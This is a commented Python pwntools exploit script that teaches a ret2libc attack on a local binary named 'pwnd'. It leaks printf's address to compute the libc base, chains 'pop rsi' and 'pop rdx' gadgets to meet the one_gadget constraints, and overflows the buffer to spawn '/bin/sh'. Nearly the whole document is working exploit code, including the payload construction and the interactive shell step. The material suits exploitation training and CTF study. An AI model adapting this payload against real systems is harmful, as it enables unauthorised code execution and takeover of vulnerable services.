#!/bin/python3

# Here, we use a slightly different variant from our classical "ret2libc.py": we use a "one_gadget" designed to open a "/bin/sh" shell with ONE gadget only!
# However, it's a little bit more complicated than that, because in order to be executed correctly this gadget must satisfy some constraints (for example RSI must be equal to 0)
# So we'll generally have to execute one or two gadgets prior to correctly "initialize" those constraints, anyway it shouldn't take long time 

from pwn import *
context(arch="amd64")

# As the "gets()" (enter user string) is asked on the same line of the "puts()" (display the message), I had trouble to get and parse the line on my distribution
# See this issue: https://stackoverflow.com/questions/58355505/pwntools-recv-on-output-that-expects-input-directly-after
# So the fix is simply to implement this custom stdin/stdout, and it works better!

remote = 0 # set it to 1 if you exploit a remote server
if remote == 0: 
    cust_stdout = process.PTY
    cust_stdin = process.PTY
    p = process('./pwnd', stdout=cust_stdout, stdin=cust_stdin)
else:
    cust_stdout = subprocess.PIPE
    cust_stdin = subprocess.PIPE
    # p = ... # don't forget to complete this for a remote server (with its IP:port)

libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6') # let's also load our libc to calculate offsets (path might be adapted depending on your distribution)
# on a remote server you'll have to now what version of libc it uses, then download the same exact version and indicate its path here

# Step 1 - Leak an address from the libc 
# I also had trouble reading the line using the classic "recvline", because a gets() is asked on the same line than the string displayed by puts()
# Using the "recvuntil" function was also an issue because we can't really predict with wich "pattern" will end the address displayed
# So I chose to use "recvregex" that here uses a regex catching an hexadecimal number of 12 characters
# You can see all PwnTools tubes on: https://docs.pwntools.com/en/stable/tubes.html

address_regex = "0[xX][0-9a-fA-F]{12}"
line = p.recvregex(address_regex)
printf_addr = line[16:]
print(line)
print("[*] Leaked printf address:", printf_addr.decode('utf-8'))

# Step 2 - Calculate the base address of the libc

libc_base = int(printf_addr.decode("utf-8"), 16) - libc.symbols["printf"] # libc_base_addr = leaked_printf_addr - printf_offset
print("[*] Libc base address:", hex(libc_base))

# Step 3 - This time we use a one_gadget. We can find some using command: one_gadget /usr/lib/x86_64-linux-gnu/libc.so.6
# Many are displayed and can be chosen, but I chose this one: "0xcb7a0 execve("/bin/sh", rsi, rdx)"
# The tool also shows us constraints to be met, which are:
#   - [rsi] == NULL || rsi == NULL
#      AND
#   - [rdx] == NULL || rdx == NULL
# Note for newbies: '||' means 'or'

# Concretely, we'll simply have to set RSI to 0 and RDX to 0
# Let's start with our gadget

one_gadget = libc_base + 0xcb7a0

# Now, we must satisfy constraints and initialize RSI to 0
# In libc, I found the gadget "0x26cf7: pop rsi; ret;" using the command: ropper -f /usr/lib/x86_64-linux-gnu/libc.so.6 --search "pop rsi"

pop_rsi_gadget = libc_base + 0x26cf7

# And last but not least, we search a gadget that would help us to set RDX to 0
# In libc, I found 0xec7dd: pop rdx; ret;" using the commmand: ropper -f /usr/lib/x86_64-linux-gnu/libc.so.6 --search "pop rdx"

pop_rdx_gadget = libc_base + 0xec7dd

# Step 4 - Construct the payload to do a return-to-libc (ret2libc) and jump to our one_gadget after RSI and RDX are initialized to 0
# One gadgets are generally easier to use, because you don't have to look/search for a '/bin/sh' string
# Sometimes, if you're lucky, constraints to be met will be simpler (1 constraint instead of 2 like here)
# If you're really lucky the execution context of your program might already meet all the condition by itself!
# So in those specific cases, you'll be able to jump directly to the one_gadget and you will get a shell!
# Remember that the one_gadget tool shows you many one gadgets to be chosen, so if you try one and it doesn't work (because you couldn't satisfy constraints correctly before jumping to it for example) then try with another until it works!

payload = b'A'*24
payload += p64(pop_rsi_gadget) # pop 0 to RSI
payload += p64(0)
payload += p64(pop_rdx_gadget) # pop 0 to RDX
payload += p64(0)
payload += p64(one_gadget) # jump to the one_gadget

p.sendline(payload)
p.interactive()
